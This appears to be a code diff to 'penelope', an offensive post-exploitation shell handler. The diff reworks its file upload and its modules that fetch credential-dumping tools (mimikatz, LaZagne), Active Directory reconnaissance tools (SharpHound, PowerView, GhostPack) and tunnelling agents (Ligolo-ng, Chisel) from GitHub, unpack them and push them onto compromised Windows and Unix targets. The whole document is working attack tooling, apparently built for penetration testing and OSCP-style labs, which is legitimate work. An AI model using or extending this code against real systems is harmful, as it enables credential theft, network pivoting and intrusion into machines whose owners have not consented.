@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.18.0"
+__version__ = "0.18.1"
 
 import os
 import io
@@ -3408,7 +3408,8 @@ class Session:
 
 		return downloaded
 
-	def upload(self, local_items, remote_path=None, randomize_fname=False):
+	def upload(self, local_items, remote_path=None, randomize_fname=False, url_to_bytes_fn=None):
+		url_to_bytes_fn = url_to_bytes_fn or url_to_bytes
 
 		# Check remote permissions
 		destination = remote_path or self.cwd
@@ -3458,7 +3459,7 @@ class Session:
 			# Download URL
 			if re.match(r'(http|ftp)s?://', item, re.IGNORECASE):
 				try:
-					filename, item = url_to_bytes(item)
+					filename, item = url_to_bytes_fn(item)
 					if not item:
 						continue
 					resolved_items.append((filename, item))
@@ -3638,8 +3639,17 @@ class Session:
 						zip_info.date_time = time.localtime(time.time())[:6]
 						myzip.writestr(zip_info, data)
 					else:
-						altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
-						myzip.write(item, arcname=altname)
+						if item.is_dir():
+							altname = f"{item.name}-{rand(8)}" if randomize_fname else item.name
+							for p in item.rglob("*"):
+								if not p.is_file():
+									continue
+								rel = p.relative_to(item)
+								altname_file = Path(altname) / rel
+								myzip.write(p, arcname=str(altname_file))
+						else:
+							altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
+							myzip.write(item, arcname=altname)
 					altnames.append(altname)
 
 			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
@@ -4491,7 +4501,15 @@ class upload_credump_scripts(Module):
 			logger.error("This module runs only on Windows shells")
 
 		elif session.OS == 'Windows':
-			session.upload(URLS['mimikatz'])
+			import tempfile
+			_, archive = url_to_bytes(URLS['mimikatz'])
+			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+				target = Path(tmpdir) / "mimikatz"
+				target.mkdir(parents=True, exist_ok=True)
+				with zipfile.ZipFile(io.BytesIO(archive)) as z:
+					z.extractall(target)
+					session.upload(str(target))
+
 			session.upload(URLS['lazagne'])
 			session.upload(URLS['snaffler'])
 			session.upload(URLS['sharpweb'])
@@ -4501,15 +4519,32 @@ class upload_ad_scripts(Module):
 	category = "Active Directory"
 	def run(session, args):
 		"""
-		Upload SharpHound, Powerview, GhostPack collection to the Windows target
+		Upload Powerview, SharpHound, GhostPack collection to the Windows target
 		"""
 		if session.OS == 'Unix':
 			logger.error("This module runs only on Windows shells")
 
 		elif session.OS == 'Windows':
-			session.upload(URLS['sharphound'])
 			session.upload(URLS['powerview'])
-			session.upload(URLS['ghostpack'])
+			
+			import tempfile
+			_, archive = url_to_bytes(URLS['sharphound'])
+			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+				target = Path(tmpdir) / "sharphound"
+				target.mkdir(parents=True, exist_ok=True)
+				with zipfile.ZipFile(io.BytesIO(archive)) as z:
+					z.extractall(target)
+					session.upload(str(target))
+
+			import tempfile
+			_, archive = url_to_bytes(URLS['ghostpack'])
+			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+				with zipfile.ZipFile(io.BytesIO(archive)) as z:
+					z.extractall(tmpdir)
+					extracted_folder = list(Path(tmpdir).iterdir())[0]
+					renamed_folder = extracted_folder.parent / "ghostpack"
+					os.rename(extracted_folder, renamed_folder)
+					session.upload(str(renamed_folder))
 
 
 class uac(Module):
@@ -4568,24 +4603,41 @@ class ligolo(Module):
 	category = "Pivoting"
 	def run(session, args):
 		"""
-		Upload the latest version of Ligolo-ng
+		Upload the latest version of Ligolo-ng agent
 		"""
 		if session.OS == 'Unix':
 			if session.arch == "x86_64":
-				files = session.upload(URLS['ligolo_amd64'])
+				url = URLS['ligolo_amd64']
 			elif session.arch in ("aarch64", "arm64"):
-				files = session.upload(URLS['ligolo_arm64'])
+				url = URLS['ligolo_arm64']
 			else:
-				logger.error("Ligolo-ng: No predefined binary to upload. Please make a pull request.")
+				logger.error("Ligolo-ng: No predefined binary to upload.")
 				print()
 				return
 
-			if files:
-				session.exec(f"tar -xzf {files[0]} agent && rm {files[0]}")
-				logger.info(f"Ligolo-ng agent decompressed!")
+			_, archive = url_to_bytes(url)
+			with tarfile.open(fileobj=io.BytesIO(archive), mode="r:gz") as tf:
+				f = tf.extractfile(tf.getmember("agent"))
+				if f is None:
+					logger.error("File 'agent' not found in downloaded archive")
+					return
+				session.upload(url, url_to_bytes_fn=lambda x: ('agent', f.read()))
 
 		elif session.OS == 'Windows':
-			logger.error("Ligolo-ng: No predefined binary to upload. Please make a pull request.")
+			if session.arch == "x64-based_PC":
+				url = URLS['ligolo_win64']
+			else:
+				logger.error("Ligolo-ng: No predefined binary to upload.")
+				print()
+				return
+
+			_, archive = url_to_bytes(url)
+			with zipfile.ZipFile(io.BytesIO(archive)) as z:
+				try:
+					session.upload(url, url_to_bytes_fn=lambda x: ('agent.exe', z.read("agent.exe")))
+				except KeyError:
+					logger.error("File 'agent' not found in downloaded archive")
+					return
 
 
 class chisel(Module):
@@ -4596,22 +4648,38 @@ class chisel(Module):
 		"""
 		if session.OS == 'Unix':
 			if session.arch == "x86_64":
-				files = session.upload(URLS['chisel_amd64'])
+				url = URLS['chisel_amd64']
 			elif session.arch in ("i386", "i686"):
-				files = session.upload(URLS['chisel_386'])
+				url = URLS['chisel_386']
 			elif session.arch in ("aarch64", "arm64"):
-				files = session.upload(URLS['chisel_arm64'])
+				url = URLS['chisel_arm64']
 			else:
-				logger.error("Chisel: No predefined binary to upload. Please make a pull request.")
+				logger.error("Chisel: No predefined binary to upload.")
 				print()
 				return
 
-			if files:
-				session.exec(f"gunzip {files[0]}")
-				logger.info(f"{paint(files[0]).yellow} decompressed!")
+			import gzip
+			_, archive = url_to_bytes(url)
+			with gzip.GzipFile(fileobj=io.BytesIO(archive), mode="rb") as g:
+				session.upload(url, url_to_bytes_fn=lambda x: ('chisel', g.read()))
 
 		elif session.OS == 'Windows':
-			logger.error("Chisel: No predefined binary to upload. Please make a pull request.")
+			if session.arch == "x64-based_PC":
+				url = URLS['chisel_winamd64']
+			elif session.arch == "x86-based_PC":
+				url = URLS['chisel_win386']
+			else:
+				logger.error("Chisel: No predefined binary to upload.")
+				print()
+				return
+
+			_, archive = url_to_bytes(url)
+			with zipfile.ZipFile(io.BytesIO(archive)) as z:
+				try:
+					session.upload(url, url_to_bytes_fn=lambda x: ('chisel.exe', z.read("chisel.exe")))
+				except KeyError:
+					logger.error("File 'chisel' not found in downloaded archive")
+					return
 
 
 class ngrok(Module):
@@ -5234,6 +5302,7 @@ def main():
 	if options.oscp_safe:
 		meterpreter.enabled = False
 		traitor.enabled = False
+		ngrok.enabled = False
 
 	global keyboard_interrupt
 	signal.signal(signal.SIGINT, lambda num, stack: core.stop())
@@ -5388,6 +5457,7 @@ URLS = {
 	'chisel_winamd64':	"https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_amd64.zip",
 	'ligolo_amd64':		"https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz",
 	'ligolo_arm64':		"https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_arm64.tar.gz",
+	'ligolo_win64':		"https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip",
 	'snaffler':		"https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe",
 	'lazagne':		"https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe",
 	'mimikatz':		"https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip",
